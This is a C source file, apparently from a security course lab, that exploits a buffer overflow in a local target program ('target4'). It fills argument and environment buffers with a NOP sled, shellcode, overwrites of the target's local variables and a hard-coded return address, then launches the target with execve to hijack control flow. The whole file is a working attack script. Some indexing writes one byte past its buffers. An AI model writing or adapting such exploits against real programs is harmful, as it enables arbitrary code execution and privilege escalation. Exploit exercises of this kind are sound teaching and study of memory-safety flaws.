#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define NOP    '\x90'
#define OFBUFLENARGV 169
#define OFBUFLENENV 11


int main(void)
{
  char *args[3];
  char *env[7];

	char overflowBufArgv[OFBUFLENARGV];
	char overflowBufEnv[OFBUFLENENV];


	// Avoid null terminating char in the string 
	int shellcodeSize = sizeof(shellcode)-1;

	int i;
	char RPAddr[]="\x20\x21\xfd\xb0";
	
	// Set everything to NOP, overwrite if the locations is useful
	for (i=0; i<OFBUFLENARGV; i++)
		overflowBufArgv[i] = NOP;
	for (i=0; i<OFBUFLENENV; i++)
		overflowBufEnv[i] = NOP;
	
	// Insert shellcode to the begining of the buffer
	for(i=0; i < shellcodeSize; i++)
		overflowBufArgv[i] = shellcode[i];

	// Local variable len, overwrite it
	char lenOverwrite[]="\x00\xbb";
	for(i=0; i < 2; i++)
		overflowBufArgv[OFBUFLENARGV -i] = lenOverwrite[i];
	// Local variable i, overwrite it 
	
	char iOverwrite[]="\xac";
	
	
	for(i=0; i < 4; i++)
		overflowBufEnv[OFBUFLENENV-i] = RPAddr[i];



  	args[0] = TARGET;
	args[1] = overflowBufArgv; 
	args[2] = NULL;
	
	env[0] = &overflowBufArgv[169];
	env[1] = &overflowBufArgv[169];
	env[2] = iOverwrite;
	env[3] = &overflowBufArgv[169];
	env[4] = &overflowBufArgv[169];
	env[5] = overflowBufEnv;
	env[6] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
